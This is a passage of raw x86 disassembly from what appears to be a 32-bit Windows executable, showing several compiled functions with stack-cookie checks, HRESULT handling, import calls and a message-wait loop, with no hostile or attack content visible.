  403afc:	push   DWORD PTR [ebp-0x628]
  403b02:	push   DWORD PTR [ebp-0x644]
  403b08:	call   DWORD PTR ds:0x4081e0
  403b0e:	push   ecx
  403b0f:	push   ecx
  403b10:	mov    edx,eax
  403b12:	mov    ecx,0x401138
  403b17:	call   0x403dbd
  403b1c:	jmp    0x403b32
  403b1e:	push   0x5
  403b20:	push   DWORD PTR [ebp-0x644]
  403b26:	call   DWORD PTR ds:0x4081e8
  403b2c:	mov    edi,DWORD PTR [ebp-0x630]
  403b32:	push   DWORD PTR [ebp-0x644]
  403b38:	call   DWORD PTR ds:0x40807c
  403b3e:	push   DWORD PTR [ebp-0x640]
  403b44:	call   DWORD PTR ds:0x40807c
  403b4a:	test   esi,esi
  403b4c:	jns    0x403b7f
  403b4e:	jmp    0x403b56
  403b50:	mov    edi,DWORD PTR [ebp-0x630]
  403b56:	push   0x5
  403b58:	push   edi
  403b59:	call   DWORD PTR ds:0x4081ec
  403b5f:	test   DWORD PTR ds:0x407500,0x2000
  403b69:	je     0x403b7f
  403b6b:	push   DWORD PTR [ebp-0x628]
  403b71:	xor    edx,edx
  403b73:	push   ecx
  403b74:	push   ecx
  403b75:	mov    ecx,0x401138
  403b7a:	call   0x403dbd
  403b7f:	push   edi
  403b80:	call   DWORD PTR ds:0x40807c
  403b86:	push   ebx
  403b87:	call   DWORD PTR ds:0x40807c
  403b8d:	mov    edi,DWORD PTR [ebp-0x634]
  403b93:	push   edi
  403b94:	call   DWORD PTR ds:0x40807c
  403b9a:	mov    ecx,DWORD PTR [ebp-0x8]
  403b9d:	mov    eax,esi
  403b9f:	pop    edi
  403ba0:	pop    esi
  403ba1:	xor    ecx,ebp
  403ba3:	pop    ebx
  403ba4:	call   0x4063a0
  403ba9:	mov    esp,ebp
  403bab:	pop    ebp
  403bac:	ret    0x4
  403baf:	int3   
  403bb0:	int3   
  403bb1:	int3   
  403bb2:	int3   
  403bb3:	int3   
  403bb4:	mov    edi,edi
  403bb6:	push   ebp
  403bb7:	mov    ebp,esp
  403bb9:	sub    esp,0x10
  403bbc:	lea    eax,[ebp-0xc]
  403bbf:	push   ebx
  403bc0:	push   esi
  403bc1:	push   edi
  403bc2:	push   eax
  403bc3:	push   0x0
  403bc5:	lea    eax,[ebp-0x8]
  403bc8:	mov    esi,ecx
  403bca:	push   eax
  403bcb:	push   esi
  403bcc:	mov    ebx,edx
  403bce:	call   DWORD PTR ds:0x4080ac
  403bd4:	mov    edi,eax
  403bd6:	test   edi,edi
  403bd8:	js     0x403cce
  403bde:	test   DWORD PTR ds:0x407500,0x4000
  403be8:	je     0x403bff
  403bea:	mov    ecx,esi
  403bec:	call   0x4036b4
  403bf1:	push   ecx
  403bf2:	push   ecx
  403bf3:	mov    edx,eax
  403bf5:	mov    ecx,0x4010e8
  403bfa:	call   0x403631
  403bff:	mov    edx,DWORD PTR [ebp-0xc]
  403c02:	lea    eax,[ebp-0x4]
  403c05:	push   eax
  403c06:	push   DWORD PTR [ebp+0x8]
  403c09:	push   ecx
  403c0a:	push   ecx
  403c0b:	mov    ecx,DWORD PTR [ebp-0x8]
  403c0e:	push   0x1
  403c10:	push   0x0
  403c12:	call   0x40522a
  403c17:	mov    edi,eax
  403c19:	test   edi,edi
  403c1b:	js     0x403c9a
  403c1d:	mov    eax,DWORD PTR [ebp-0x4]
  403c20:	test   eax,eax
  403c22:	je     0x403c9a
  403c24:	test   bl,0x2
  403c27:	je     0x403c51
  403c29:	push   0x80
  403c2e:	push   eax
  403c2f:	call   DWORD PTR ds:0x4081fc
  403c35:	mov    ecx,DWORD PTR [ebp-0x4]
  403c38:	lea    edx,[ebp-0x10]
  403c3b:	push   ecx
  403c3c:	xor    eax,eax
  403c3e:	mov    DWORD PTR [ebp-0x10],ecx
  403c41:	push   ecx
  403c42:	test   ecx,ecx
  403c44:	push   0xffffffff
  403c46:	setne  al
  403c49:	push   eax
  403c4a:	call   0x403e9e
  403c4f:	jmp    0x403c60
  403c51:	test   bl,0x40
  403c54:	je     0x403c63
  403c56:	mov    ecx,DWORD PTR [ebp+0x8]
  403c59:	mov    edx,eax
  403c5b:	call   0x403d50
  403c60:	mov    eax,DWORD PTR [ebp-0x4]
  403c63:	test   DWORD PTR ds:0x407500,0x4000
  403c6d:	je     0x403c91
  403c6f:	mov    ecx,esi
  403c71:	call   0x4036b4
  403c76:	push   eax
  403c77:	push   DWORD PTR [ebp-0x4]
  403c7a:	call   DWORD PTR ds:0x4081e0
  403c80:	push   ecx
  403c81:	push   ecx
  403c82:	mov    edx,eax
  403c84:	mov    ecx,0x401128
  403c89:	call   0x403dbd
  403c8e:	mov    eax,DWORD PTR [ebp-0x4]
  403c91:	push   eax
  403c92:	call   DWORD PTR ds:0x40807c
  403c98:	jmp    0x403cbc
  403c9a:	test   DWORD PTR ds:0x407500,0x4000
  403ca4:	je     0x403cbc
  403ca6:	mov    ecx,esi
  403ca8:	call   0x4036b4
  403cad:	push   eax
  403cae:	push   ecx
  403caf:	push   ecx
  403cb0:	xor    edx,edx
  403cb2:	mov    ecx,0x401128
  403cb7:	call   0x403dbd
  403cbc:	push   DWORD PTR [ebp-0x8]
  403cbf:	call   DWORD PTR ds:0x40818c
  403cc5:	push   DWORD PTR [ebp-0xc]
  403cc8:	call   DWORD PTR ds:0x40818c
  403cce:	mov    eax,edi
  403cd0:	pop    edi
  403cd1:	pop    esi
  403cd2:	pop    ebx
  403cd3:	mov    esp,ebp
  403cd5:	pop    ebp
  403cd6:	ret    0x4
  403cd9:	int3   
  403cda:	int3   
  403cdb:	int3   
  403cdc:	int3   
  403cdd:	int3   
  403cde:	mov    edi,edi
  403ce0:	push   ebp
  403ce1:	mov    ebp,esp
  403ce3:	push   ecx
  403ce4:	push   ecx
  403ce5:	mov    eax,ds:0x407004
  403cea:	xor    eax,ebp
  403cec:	mov    DWORD PTR [ebp-0x4],eax
  403cef:	push   esi
  403cf0:	push   edi
  403cf1:	lea    eax,[ebp-0x8]
  403cf4:	mov    esi,edx
  403cf6:	push   eax
  403cf7:	mov    eax,0x40164c
  403cfc:	push   eax
  403cfd:	push   eax
  403cfe:	push   ecx
  403cff:	call   DWORD PTR ds:0x4080f8
  403d05:	mov    edi,eax
  403d07:	test   edi,edi
  403d09:	js     0x403d37
  403d0b:	mov    eax,DWORD PTR [ebp-0x8]
  403d0e:	push   DWORD PTR [ebp+0x8]
  403d11:	push   esi
  403d12:	mov    ecx,DWORD PTR [eax]
  403d14:	push   eax
  403d15:	mov    esi,DWORD PTR [ecx+0xc]
  403d18:	mov    ecx,esi
  403d1a:	call   DWORD PTR ds:0x4082f0
  403d20:	call   esi
  403d22:	mov    edi,eax
  403d24:	mov    eax,DWORD PTR [ebp-0x8]
  403d27:	push   eax
  403d28:	mov    ecx,DWORD PTR [eax]
  403d2a:	mov    esi,DWORD PTR [ecx+0x8]
  403d2d:	mov    ecx,esi
  403d2f:	call   DWORD PTR ds:0x4082f0
  403d35:	call   esi
  403d37:	mov    ecx,DWORD PTR [ebp-0x4]
  403d3a:	mov    eax,edi
  403d3c:	pop    edi
  403d3d:	xor    ecx,ebp
  403d3f:	pop    esi
  403d40:	call   0x4063a0
  403d45:	mov    esp,ebp
  403d47:	pop    ebp
  403d48:	ret    0x4
  403d4b:	int3   
  403d4c:	int3   
  403d4d:	int3   
  403d4e:	int3   
  403d4f:	int3   
  403d50:	mov    edi,edi
  403d52:	push   ebp
  403d53:	mov    ebp,esp
  403d55:	push   ecx
  403d56:	push   ecx
  403d57:	mov    eax,ds:0x407004
  403d5c:	xor    eax,ebp
  403d5e:	mov    DWORD PTR [ebp-0x4],eax
  403d61:	push   esi
  403d62:	push   edi
  403d63:	lea    eax,[ebp-0x8]
  403d66:	mov    esi,edx
  403d68:	push   eax
  403d69:	mov    eax,0x40164c
  403d6e:	push   eax
  403d6f:	push   eax
  403d70:	push   ecx
  403d71:	call   DWORD PTR ds:0x4080f8
  403d77:	mov    edi,eax
  403d79:	test   edi,edi
  403d7b:	js     0x403da6
  403d7d:	mov    eax,DWORD PTR [ebp-0x8]
  403d80:	push   esi
  403d81:	push   eax
  403d82:	mov    ecx,DWORD PTR [eax]
  403d84:	mov    esi,DWORD PTR [ecx+0x14]
  403d87:	mov    ecx,esi
  403d89:	call   DWORD PTR ds:0x4082f0
  403d8f:	call   esi
  403d91:	mov    edi,eax
  403d93:	mov    eax,DWORD PTR [ebp-0x8]
  403d96:	push   eax
  403d97:	mov    ecx,DWORD PTR [eax]
  403d99:	mov    esi,DWORD PTR [ecx+0x8]
  403d9c:	mov    ecx,esi
  403d9e:	call   DWORD PTR ds:0x4082f0
  403da4:	call   esi
  403da6:	mov    ecx,DWORD PTR [ebp-0x4]
  403da9:	mov    eax,edi
  403dab:	pop    edi
  403dac:	xor    ecx,ebp
  403dae:	pop    esi
  403daf:	call   0x4063a0
  403db4:	mov    esp,ebp
  403db6:	pop    ebp
  403db7:	ret    
  403db8:	int3   
  403db9:	int3   
  403dba:	int3   
  403dbb:	int3   
  403dbc:	int3   
  403dbd:	mov    edi,edi
  403dbf:	push   ebp
  403dc0:	mov    ebp,esp
  403dc2:	sub    esp,0x30
  403dc5:	mov    eax,ds:0x407004
  403dca:	xor    eax,ebp
  403dcc:	mov    DWORD PTR [ebp-0x8],eax
  403dcf:	push   ebx
  403dd0:	xor    ebx,ebx
  403dd2:	mov    DWORD PTR [ebp-0x30],edx
  403dd5:	mov    edx,DWORD PTR [ebp+0x10]
  403dd8:	lea    eax,[ebp-0x30]
  403ddb:	mov    DWORD PTR [ebp-0x2c],eax
  403dde:	mov    DWORD PTR [ebp-0x28],ebx
  403de1:	mov    DWORD PTR [ebp-0x24],0x4
  403de8:	mov    DWORD PTR [ebp-0x20],ebx
  403deb:	push   esi
  403dec:	push   edi
  403ded:	mov    edi,ecx
  403def:	test   edx,edx
  403df1:	je     0x403e10
  403df3:	mov    ecx,edx
  403df5:	lea    esi,[ecx+0x2]
  403df8:	mov    ax,WORD PTR [ecx]
  403dfb:	add    ecx,0x2
  403dfe:	cmp    ax,bx
  403e01:	jne    0x403df8
  403e03:	sub    ecx,esi
  403e05:	sar    ecx,1
  403e07:	lea    ecx,[ecx*2+0x2]
  403e0e:	jmp    0x403e13
  403e10:	push   0xa
  403e12:	pop    ecx
  403e13:	test   edx,edx
  403e15:	jne    0x403e1c
  403e17:	mov    edx,0x401640
  403e1c:	lea    eax,[ebp-0x2c]
  403e1f:	mov    DWORD PTR [ebp-0x1c],edx
  403e22:	push   eax
  403e23:	push   0x2
  403e25:	push   edi
  403e26:	push   DWORD PTR ds:0x4074d4
  403e2c:	mov    DWORD PTR [ebp-0x18],ebx
  403e2f:	push   DWORD PTR ds:0x4074d0
  403e35:	mov    DWORD PTR [ebp-0x14],ecx
  403e38:	mov    DWORD PTR [ebp-0x10],ebx
  403e3b:	call   DWORD PTR ds:0x408018
  403e41:	mov    ecx,DWORD PTR [ebp-0x8]
  403e44:	pop    edi
  403e45:	pop    esi
  403e46:	xor    ecx,ebp
  403e48:	pop    ebx
  403e49:	call   0x4063a0
  403e4e:	mov    esp,ebp
  403e50:	pop    ebp
  403e51:	ret    0xc
  403e54:	int3   
  403e55:	int3   
  403e56:	int3   
  403e57:	int3   
  403e58:	int3   
  403e59:	mov    edi,edi
  403e5b:	push   ebp
  403e5c:	mov    ebp,esp
  403e5e:	push   ecx
  403e5f:	push   ebx
  403e60:	push   esi
  403e61:	push   edi
  403e62:	mov    edi,DWORD PTR [ebp+0x8]
  403e65:	xor    ebx,ebx
  403e67:	mov    esi,edx
  403e69:	mov    DWORD PTR [ebp-0x4],ecx
  403e6c:	inc    ebx
  403e6d:	and    DWORD PTR [edi],0x0
  403e70:	cmp    esi,0xffffffff
  403e73:	jne    0x403e79
  403e75:	or     DWORD PTR [edi],edx
  403e77:	jmp    0x403e8e
  403e79:	call   DWORD PTR ds:0x408254
  403e7f:	sub    eax,DWORD PTR [ebp-0x4]
  403e82:	cmp    eax,esi
  403e84:	jbe    0x403e8a
  403e86:	xor    ebx,ebx
  403e88:	jmp    0x403e8e
  403e8a:	sub    esi,eax
  403e8c:	mov    DWORD PTR [edi],esi
  403e8e:	pop    edi
  403e8f:	pop    esi
  403e90:	mov    eax,ebx
  403e92:	pop    ebx
  403e93:	mov    esp,ebp
  403e95:	pop    ebp
  403e96:	ret    0x4
  403e99:	int3   
  403e9a:	int3   
  403e9b:	int3   
  403e9c:	int3   
  403e9d:	int3   
  403e9e:	mov    edi,edi
  403ea0:	push   ebp
  403ea1:	mov    ebp,esp
  403ea3:	sub    esp,0x34
  403ea6:	lea    eax,[ebp-0x18]
  403ea9:	push   ebx
  403eaa:	push   edi
  403eab:	push   eax
  403eac:	lea    eax,[ebp-0x14]
  403eaf:	mov    edi,edx
  403eb1:	push   eax
  403eb2:	call   DWORD PTR ds:0x408184
  403eb8:	test   eax,eax
  403eba:	js     0x403ed1
  403ebc:	cmp    DWORD PTR [ebp-0x14],0x0
  403ec0:	jne    0x403ed1
  403ec2:	cmp    DWORD PTR [ebp-0x18],0x6
  403ec6:	jne    0x403ed1
  403ec8:	mov    DWORD PTR [ebp-0xc],0x1
  403ecf:	jmp    0x403ed5
  403ed1:	and    DWORD PTR [ebp-0xc],0x0
  403ed5:	call   DWORD PTR ds:0x408254
  403edb:	mov    ebx,DWORD PTR [ebp+0xc]
  403ede:	mov    ecx,ebx
  403ee0:	mov    DWORD PTR [ebp-0x10],eax
  403ee3:	mov    DWORD PTR [ebp-0x8],ecx
  403ee6:	test   edi,edi
  403ee8:	jne    0x403ef6
  403eea:	cmp    ebx,0xffffffff
  403eed:	jne    0x403ef6
  403eef:	or     eax,ebx
  403ef1:	jmp    0x404038
  403ef6:	push   esi
  403ef7:	mov    esi,DWORD PTR [ebp+0x8]
  403efa:	cmp    DWORD PTR [ebp-0xc],0x0
  403efe:	je     0x403f29
  403f00:	lea    eax,[ebp-0x4]
  403f03:	push   eax
  403f04:	push   edi
  403f05:	push   esi
  403f06:	push   ecx
  403f07:	push   0x18
  403f09:	call   DWORD PTR ds:0x408190
  403f0f:	cmp    eax,0x80010115
  403f14:	jne    0x403f1f
  403f16:	mov    DWORD PTR [ebp-0x4],0x102
  403f1d:	jmp    0x403f3c
  403f1f:	test   eax,eax
  403f21:	jns    0x403f3c
  403f23:	or     DWORD PTR [ebp-0x4],0xffffffff
  403f27:	jmp    0x403f3c
  403f29:	push   0x0
  403f2b:	push   0x1cff
  403f30:	push   ecx
  403f31:	push   edi
  403f32:	push   esi
  403f33:	call   DWORD PTR ds:0x40812c
  403f39:	mov    DWORD PTR [ebp-0x4],eax
  403f3c:	mov    ecx,DWORD PTR [ebp-0x10]
  403f3f:	lea    eax,[ebp-0x8]
  403f42:	push   eax
  403f43:	mov    edx,ebx
  403f45:	call   0x403e59
  403f4a:	test   eax,eax
  403f4c:	jne    0x403f58
  403f4e:	mov    eax,0x102
  403f53:	mov    DWORD PTR [ebp-0x4],eax
  403f56:	jmp    0x403f5b
  403f58:	mov    eax,DWORD PTR [ebp-0x4]
  403f5b:	cmp    eax,esi
  403f5d:	jne    0x404007
  403f63:	push   0x1
  403f65:	xor    eax,eax
  403f67:	push   eax
  403f68:	push   eax
  403f69:	push   eax
  403f6a:	lea    eax,[ebp-0x34]
  403f6d:	push   eax
  403f6e:	call   DWORD PTR ds:0x408130
  403f74:	test   eax,eax
  403f76:	je     0x404000
  403f7c:	cmp    DWORD PTR [ebp-0x30],0x12
  403f80:	je     0x403ff5
  403f82:	lea    eax,[ebp-0x34]
  403f85:	push   eax
  403f86:	call   DWORD PTR ds:0x408138
  403f8c:	cmp    DWORD PTR [ebp-0x30],0x20
  403f90:	jne    0x403fb3
  403f92:	mov    eax,0xfffe
  403f97:	cmp    WORD PTR [ebp-0x28],ax
  403f9b:	je     0x403fb3
  403f9d:	push   0x7f02
  403fa2:	push   0x0
  403fa4:	call   DWORD PTR ds:0x408140
  403faa:	push   eax
  403fab:	call   DWORD PTR ds:0x40813c
  403fb1:	jmp    0x403fbd
  403fb3:	lea    eax,[ebp-0x34]
  403fb6:	push   eax
  403fb7:	call   DWORD PTR ds:0x408144
  403fbd:	test   esi,esi
  403fbf:	je     0x403fd5
  403fc1:	xor    eax,eax
  403fc3:	push   eax
  403fc4:	push   eax
  403fc5:	push   eax
  403fc6:	push   edi
  403fc7:	push   esi
  403fc8:	call   DWORD PTR ds:0x40823c
  403fce:	cmp    eax,0x102
  403fd3:	jne    0x403ff0
  403fd5:	mov    ecx,DWORD PTR [ebp-0x10]
  403fd8:	lea    eax,[ebp-0x8]
  403fdb:	push   eax
  403fdc:	mov    edx,ebx
  403fde:	call   0x403e59
  403fe3:	test   eax,eax
  403fe5:	jne    0x403f63
  403feb:	mov    eax,0x102
  403ff0:	mov    DWORD PTR [ebp-0x4],eax
  403ff3:	jmp    0x404003
  403ff5:	push   DWORD PTR [ebp-0x2c]
  403ff8:	call   DWORD PTR ds:0x408134
  403ffe:	jmp    0x403feb
  404000:	mov    eax,DWORD PTR [ebp-0x4]
  404003:	cmp    eax,esi
  404005:	je     0x40400e
  404007:	cmp    eax,0xc0
  40400c:	jne    0x404016
  40400e:	mov    ecx,DWORD PTR [ebp-0x8]
  404011:	jmp    0x403efa
  404016:	mov    ebx,0x102
  40401b:	cmp    eax,ebx
  40401d:	jne    0x404037
  40401f:	test   esi,esi
  404021:	je     0x404037
  404023:	xor    eax,eax
  404025:	push   eax
  404026:	push   eax
  404027:	push   eax
  404028:	push   edi
  404029:	push   esi
  40402a:	call   DWORD PTR ds:0x40823c
  404030:	cmp    eax,ebx
  404032:	jne    0x404037
  404034:	mov    eax,DWORD PTR [ebp-0x4]
  404037:	pop    esi
  404038:	pop    edi
  404039:	pop    ebx
  40403a:	mov    esp,ebp
  40403c:	pop    ebp
  40403d:	ret    0x10
  404040:	int3   
  404041:	int3   
  404042:	int3   
  404043:	int3   
  404044:	int3   
  404045:	mov    edi,edi
  404047:	push   ebp
  404048:	mov    ebp,esp
  40404a:	mov    eax,DWORD PTR [ebp+0xc]
  40404d:	push   esi
  40404e:	xor    esi,esi
  404050:	test   eax,eax
  404052:	je     0x40405b
  404054:	cmp    eax,0x7fffffff
  404059:	jbe    0x404060
  40405b:	mov    esi,0x80070057
  404060:	test   esi,esi
  404062:	js     0x40409b
  404064:	push   ebx
  404065:	mov    ebx,DWORD PTR [ebp+0x8]
  404068:	xor    esi,esi
  40406a:	push   edi
  40406b:	lea    edi,[eax-0x1]
  40406e:	lea    eax,[ebp+0x14]
  404071:	push   eax
  404072:	push   DWORD PTR [ebp+0x10]
  404075:	push   edi
  404076:	push   ebx
  404077:	call   DWORD PTR ds:0x40828c
  40407d:	add    esp,0x10
  404080:	test   eax,eax
  404082:	js     0x40408c
  404084:	cmp    eax,edi
  404086:	ja     0x40408c
  404088:	jne    0x404097
  40408a:	jmp    0x404091
  40408c:	mov    esi,0x8007007a
  404091:	xor    eax,eax
  404093:	mov    WORD PTR [ebx+edi*2],ax
  404097:	pop    edi
  404098:	pop    ebx
  404099:	jmp    0x4040a7
  40409b:	test   eax,eax
  40409d:	je     0x4040a7
  40409f:	mov    ecx,DWORD PTR [ebp+0x8]
  4040a2:	xor    eax,eax
  4040a4:	mov    WORD PTR [ecx],ax
  4040a7:	mov    eax,esi
  4040a9:	pop    esi
  4040aa:	pop    ebp
  4040ab:	ret    
  4040ac:	int3   
  4040ad:	int3   
  4040ae:	int3   
  4040af:	int3   
  4040b0:	int3   
  4040b1:	call   DWORD PTR ds:0x4081a0
  4040b7:	test   eax,eax
  4040b9:	jle    0x4040c5
  4040bb:	movzx  eax,ax
  4040be:	or     eax,0x80070000
  4040c3:	test   eax,eax
  4040c5:	js     0x4040cc
  4040c7:	mov    eax,0x80004005
  4040cc:	ret    
  4040cd:	int3   
  4040ce:	int3   
  4040cf:	int3   
  4040d0:	int3   
  4040d1:	int3   
  4040d2:	mov    edi,edi
  4040d4:	push   ebp
  4040d5:	mov    ebp,esp
  4040d7:	sub    esp,0x120
  4040dd:	mov    eax,ds:0x407004
  4040e2:	xor    eax,ebp
  4040e4:	mov    DWORD PTR [ebp-0x4],eax
  4040e7:	lea    eax,[ebp-0x120]
  4040ed:	mov    DWORD PTR [ebp-0x120],0x11c
  4040f7:	push   eax
  4040f8:	call   DWORD PTR ds:0x40825c
  4040fe:	test   eax,eax
  404100:	je     0x404118
  404102:	test   BYTE PTR [ebp-0x8],0x10
  404106:	je     0x404116
  404108:	test   DWORD PTR [ebp-0x8],0x100
  40410f:	jne    0x404116
  404111:	xor    eax,eax
  404113:	inc    eax
  404114:	jmp    0x404118
  404116:	xor    eax,eax
  404118:	mov    ecx,DWORD PTR [ebp-0x4]
  40411b:	xor    ecx,ebp
  40411d:	call   0x4063a0
  404122:	mov    esp,ebp
  404124:	pop    ebp
  404125:	ret    
  404126:	int3   
  404127:	int3   
  404128:	int3   
  404129:	int3   
  40412a:	int3   
  40412b:	mov    edi,edi
  40412d:	push   esi
  40412e:	mov    esi,ecx
  404130:	push   edi
  404131:	test   edx,edx
  404133:	je     0x40413b
  404135:	cmp    WORD PTR [edx],0x0
  404139:	jne    0x404140
  40413b:	mov    edx,0x401718
  404140:	push   0x40
  404142:	lea    eax,[esi+0x4]
  404145:	pop    ecx
  404146:	sub    edx,eax
  404148:	movzx  edi,WORD PTR [edx+eax*1]
  40414c:	test   di,di
  40414f:	je     0x40415d
  404151:	mov    WORD PTR [eax],di
  404154:	add    eax,0x2
  404157:	dec    ecx
  404158:	cmp    ecx,0x1
  40415b:	ja     0x404148
  40415d:	xor    ecx,ecx
  40415f:	mov    WORD PTR [eax],cx
  404162:	pop    edi
  404163:	mov    DWORD PTR [esi],0x2
  404169:	pop    esi
  40416a:	ret    
  40416b:	int3   
  40416c:	int3   
  40416d:	int3   
  40416e:	int3   
  40416f:	int3   
  404170:	mov    edi,edi
  404172:	push   ebp
  404173:	mov    ebp,esp
  404175:	sub    esp,0x214
  40417b:	mov    eax,ds:0x407004
  404180:	xor    eax,ebp
  404182:	mov    DWORD PTR [ebp-0x4],eax
  404185:	push   ebx
  404186:	push   esi
  404187:	push   edi
  404188:	mov    ebx,ecx
  40418a:	mov    DWORD PTR [ebp-0x214],edx
  404190:	push   ebx
  404191:	push   DWORD PTR ds:0x4074d4
  404197:	mov    DWORD PTR [ebp-0x20c],ebx
  40419d:	push   DWORD PTR ds:0x4074d0
  4041a3:	call   DWORD PTR ds:0x408274
  4041a9:	test   al,al
  4041ab:	je     0x404359
  4041b1:	push   0x1e8
  4041b6:	xor    ebx,ebx
  4041b8:	lea    eax,[ebp-0x1f0]
  4041be:	push   ebx
  4041bf:	push   eax
  4041c0:	call   0x406aee
  4041c5:	mov    esi,DWORD PTR [ebp+0x8]
  4041c8:	lea    eax,[ebp-0x214]
  4041ce:	add    esp,0xc
  4041d1:	mov    DWORD PTR [ebp-0x1e8],eax
  4041d7:	lea    eax,[ebp-0x208]
  4041dd:	mov    DWORD PTR [ebp-0x208],0xb
  4041e7:	mov    DWORD PTR [ebp-0x1d8],eax
  4041ed:	lea    ecx,[ebp-0x1ac]
  4041f3:	lea    eax,[ebp+0xc]
  4041f6:	mov    DWORD PTR [ebp-0x210],ebx
  4041fc:	push   0x4
  4041fe:	pop    edx
  4041ff:	mov    DWORD PTR [ebp-0x204],ebx
  404205:	mov    edi,ebx
  404207:	mov    DWORD PTR [ebp-0x1fc],0x30
  404211:	mov    DWORD PTR [ebp-0x1f8],0x407148
  40421b:	mov    DWORD PTR [ebp-0x1f4],ebx
  404221:	mov    DWORD PTR [ebp-0x1f0],0x10
  40422b:	mov    DWORD PTR [ebp-0x1ec],ebx
  404231:	mov    DWORD PTR [ebp-0x1e4],ebx
  404237:	mov    DWORD PTR [ebp-0x1e0],edx
  40423d:	mov    DWORD PTR [ebp-0x1dc],ebx
  404243:	mov    DWORD PTR [ebp-0x1d4],ebx
  404249:	mov    DWORD PTR [ebp-0x1d0],edx
  40424f:	mov    DWORD PTR [ebp-0x1cc],ebx
  404255:	mov    DWORD PTR [ebp-0x1c8],eax
  40425b:	mov    DWORD PTR [ebp-0x1c4],ebx
  404261:	mov    DWORD PTR [ebp-0x1c0],edx
  404267:	mov    DWORD PTR [ebp-0x1bc],ebx
  40426d:	mov    DWORD PTR [ecx-0x8],ebx
  404270:	mov    DWORD PTR [ecx-0x4],edx
  404273:	mov    DWORD PTR [ecx],ebx
  404275:	cmp    edi,DWORD PTR [ebp+0xc]
  404278:	jae    0x4042cb
  40427a:	cmp    DWORD PTR [esi],0x1
  40427d:	lea    eax,[esi+0x4]
  404280:	mov    DWORD PTR [ecx-0xc],esi
  404283:	je     0x40428b
  404285:	lea    eax,[ebp-0x204]
  40428b:	cmp    DWORD PTR [esi],0x2
  40428e:	mov    DWORD PTR [ecx+0xc],edx
  404291:	lea    edx,[esi+0x4]
  404294:	mov    DWORD PTR [ecx+0x4],eax
  404297:	mov    DWORD PTR [ecx+0x8],ebx
  40429a:	mov    DWORD PTR [ecx+0x10],ebx
  40429d:	je     0x4042a5
  40429f:	lea    edx,[ebp-0x1fc]
  4042a5:	lea    eax,[edx+0x2]
  4042a8:	mov    DWORD PTR [ebp-0x200],eax
  4042ae:	mov    ax,WORD PTR [edx]
  4042b1:	add    edx,0x2
  4042b4:	cmp    ax,bx
  4042b7:	jne    0x4042ae
  4042b9:	sub    edx,DWORD PTR [ebp-0x200]
  4042bf:	lea    eax,[esi+0x4]
  4042c2:	sar    edx,1
  4042c4:	cmp    DWORD PTR [esi],0x2
  4042c7:	je     0x40430e
  4042c9:	jmp    0x404308
  4042cb:	lea    eax,[ebp-0x210]
  4042d1:	mov    DWORD PTR [ecx-0xc],eax
  4042d4:	lea    eax,[ebp-0x204]
  4042da:	mov    DWORD PTR [ecx+0xc],edx
  4042dd:	lea    edx,[ebp-0x1fc]
  4042e3:	mov    DWORD PTR [ecx+0x4],eax
  4042e6:	lea    eax,[edx+0x2]
  4042e9:	mov    DWORD PTR [ecx+0x8],ebx
  4042ec:	mov    DWORD PTR [ecx+0x10],ebx
  4042ef:	mov    DWORD PTR [ebp-0x200],eax
  4042f5:	mov    ax,WORD PTR [edx]
  4042f8:	add    edx,0x2
  4042fb:	cmp    ax,bx
  4042fe:	jne    0x4042f5
  404300:	sub    edx,DWORD PTR [ebp-0x200]
  404306:	sar    edx,1
  404308:	lea    eax,[ebp-0x1fc]
  40430e:	mov    DWORD PTR [ecx+0x14],eax
  404311:	inc    edi
  404312:	lea    eax,[edx*2+0x2]
  404319:	mov    DWORD PTR [ecx+0x20],ebx
  40431c:	mov    DWORD PTR [ecx+0x1c],eax
  40431f:	add    esi,0x84
  404325:	mov    DWORD PTR [ecx+0x18],ebx
  404328:	add    ecx,0x30
  40432b:	push   0x4
  40432d:	pop    edx
  40432e:	cmp    edi,0x9
  404331:	jb     0x40426d
  404337:	mov    ebx,DWORD PTR [ebp-0x20c]
  40433d:	lea    eax,[ebp-0x1f8]
  404343:	push   eax
  404344:	push   0x1f
  404346:	push   ebx
  404347:	push   DWORD PTR ds:0x4074d4
  40434d:	push   DWORD PTR ds:0x4074d0
  404353:	call   DWORD PTR ds:0x408018
  404359:	mov    ecx,DWORD PTR [ebp-0x4]
  40435c:	pop    edi
  40435d:	pop    esi
  40435e:	xor    ecx,ebp
  404360:	pop    ebx
  404361:	call   0x4063a0
  404366:	mov    esp,ebp
  404368:	pop    ebp
  404369:	ret    0x8
  40436c:	int3   
  40436d:	int3   
  40436e:	int3   
  40436f:	int3   
  404370:	int3   
  404371:	mov    edi,edi
  404373:	push   ebp
  404374:	mov    ebp,esp
  404376:	sub    esp,0x124
  40437c:	mov    eax,ds:0x407004
  404381:	xor    eax,ebp
  404383:	mov    DWORD PTR [ebp-0x4],eax
  404386:	push   esi
  404387:	mov    esi,ecx
  404389:	mov    DWORD PTR [ebp-0x120],0x11c
  404393:	lea    eax,[ebp-0x120]
  404399:	push   eax
  40439a:	and    DWORD PTR [esi],0x0
  40439d:	call   DWORD PTR ds:0x40825c
  4043a3:	test   eax,eax
  4043a5:	je     0x4043af
  4043a7:	mov    ecx,DWORD PTR [ebp-0x8]
  4043aa:	and    ecx,0x40
  4043ad:	jne    0x4043b6
  4043af:	mov    edx,esi
  4043b1:	call   0x405bae
  4043b6:	mov    ecx,DWORD PTR [ebp-0x4]
  4043b9:	mov    eax,esi
  4043bb:	xor    ecx,ebp
  4043bd:	pop    esi
  4043be:	call   0x4063a0
  4043c3:	mov    esp,ebp
  4043c5:	pop    ebp
  4043c6:	ret    0x4
  4043c9:	int3   
  4043ca:	int3   
  4043cb:	int3   
  4043cc:	int3   
  4043cd:	int3   
  4043ce:	mov    edi,edi
  4043d0:	push   ebp
  4043d1:	mov    ebp,esp
  4043d3:	sub    esp,0x224
  4043d9:	mov    eax,ds:0x407004
  4043de:	xor    eax,ebp
  4043e0:	mov    DWORD PTR [ebp-0x4],eax
  4043e3:	push   ebx
  4043e4:	push   esi
  4043e5:	push   edi
  4043e6:	push   ecx
  4043e7:	xor    esi,esi
  4043e9:	call   0x404c33
  4043ee:	test   eax,eax
  4043f0:	je     0x4044ca
  4043f6:	xor    eax,eax
  4043f8:	push   0x206
  4043fd:	push   eax
  4043fe:	mov    WORD PTR [ebp-0x210],ax
  404405:	lea    eax,[ebp-0x20e]
  40440b:	push   eax
  40440c:	call   0x406aee
  404411:	add    esp,0xc
  404414:	xor    ebx,ebx
  404416:	call   0x4040d2
  40441b:	test   eax,eax
  40441d:	je     0x404429
  40441f:	push   0x1
  404421:	call   DWORD PTR ds:0x4080a4
  404427:	mov    ebx,eax
  404429:	mov    edi,0x104
  40442e:	lea    eax,[ebp-0x210]
  404434:	push   edi
